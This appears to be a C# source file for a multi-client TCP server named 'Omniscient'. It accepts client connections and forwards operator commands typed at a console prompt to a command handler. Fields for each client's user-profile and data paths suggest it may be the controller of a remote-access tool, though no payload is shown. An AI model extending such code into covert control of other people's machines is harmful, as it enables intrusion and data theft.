using System.Net;
using System.Net.Sockets;
using System.Collections.Concurrent;

namespace OmniscientServer
{
    public class Server
    {
        private TcpListener listener;
        public ConcurrentDictionary<int, TcpClient> clients;
        private HandleCommand handleCommand;
        public string dataPath;
        public bool isConnected;
        public int clientId;
        public string clientHost;
        public string clientPort;
        public string clientUserProfilePath;
        public string clientDataPath;
        private int count;

        public Server(string ipAddress, int port, string dataPath)
        {
            IPAddress address = IPAddress.Parse(ipAddress);
            listener = new TcpListener(address, port);
            this.dataPath = dataPath;
            clients = new ConcurrentDictionary<int, TcpClient>();
            handleCommand = new HandleCommand(this);
            isConnected = false;
            count = 0;
        }

        public void Start()
        {
            listener.Start();
            Console.WriteLine("Omniscient$ Server started. Waiting for connections...");

            new Thread(() =>
            {
                while (true)
                {
                    var client = listener.AcceptTcpClient();
                    int id = count++;
                    clients[id] = client;
                    Console.Write($"Client with ID {id} connected.\nOmniscient$ ");
                    HandleDisconnect handleDisconnect = new HandleDisconnect(client, id, clients);
                    handleDisconnect.Start();
                }
            }).Start();

            while (true)
            {
                Console.Write("Omniscient$ ");
                string? command = Console.ReadLine()?.Trim();
                if (command != null) {
                    handleCommand.Execute(command);
                }
            }
        }
    }
}
